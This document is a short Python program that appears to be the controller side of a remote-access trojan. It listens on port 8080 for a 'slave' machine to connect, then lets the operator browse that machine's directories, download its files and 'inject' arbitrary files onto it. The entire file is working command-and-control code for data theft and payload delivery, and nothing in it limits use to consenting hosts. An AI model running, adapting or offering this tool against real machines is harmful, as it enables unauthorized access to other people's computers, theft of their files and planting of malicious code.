import socket
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#host = socket.gethostname()
#host = "0.0.0.0"
host = "0.0.0.0"
print(host)
port = 8080
s.bind((host, port))
print("view_cwd: get directory where slave works")
print("custom_dir : lists files and directories of selected directory")
print("get_file : download slave's files")
print("send_file : inject a file in slave machine")
print("")
print(f"server is currently running {host}")
print("Waiting for incoming connections ...")
s.listen(1)
conn, addr = s.accept()
print("")
print(f"{addr} has connected successfully")
while True:
    command = input(str("command >>"))
    if command == "view_cwd":
        conn.send(command.encode())
        print("")
        print("Command sent, Waiting for execution")
        print("")
        print(f"{command} command sent ... waiting for exec ...")
        files = conn.recv(5000)
        files = files.decode()
        print(f"CMD output {files}")
    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Enter custom Direc: "))
        conn.send(user_input.encode())
        print("")
        print(f"{user_input} command sent")
        files = conn.recv(5000)
        files = files.decode()
        print(f"{command} CMD on {user_input} output {files}")
    elif command == "get_file":
        conn.send(command.encode())
        file_path_name = input(str("Please insert the filename (!! DON'T FORGET THE PATH !!): "))
        conn.send(file_path_name.encode())
        file_data = conn.recv(10000)
        new_file_name = input(str("New file name with extention: "))
        with open(new_file_name, "wb") as f:
            f.write(file_data)
            f.close()
    elif command == "send_file":
        conn.send(command.encode())
        file_path_and_name_on_my_pc = input(str("Path and name of the file to inject: "))
        file_name_sl = input(str("File name for slave machine (!! DON'T FORGET THE EXTENSION !!): "))
        file_master = open(file_path_and_name_on_my_pc, "rb")
        data = file_master.read()
        conn.send(data)
        conn.send(file_name_sl.encode())

    else:
        print("")
        print("command unrecognized")
